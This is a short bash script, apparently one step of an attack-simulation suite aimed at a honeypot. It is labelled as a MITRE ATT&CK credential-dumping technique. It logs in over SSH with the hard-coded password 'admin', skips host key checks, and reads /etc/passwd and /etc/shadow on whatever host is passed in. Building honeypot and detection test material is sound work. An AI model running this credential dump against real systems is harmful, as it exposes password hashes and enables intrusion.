#!/usr/bin/env bash
# S09 — Password File Dump
# Tactic : Credential Access (TA0006)
# Technique: T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S09 Password File Dump — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "cat /etc/passwd; cat /etc/shadow" && echo "[OK]" || echo "[FAIL]"
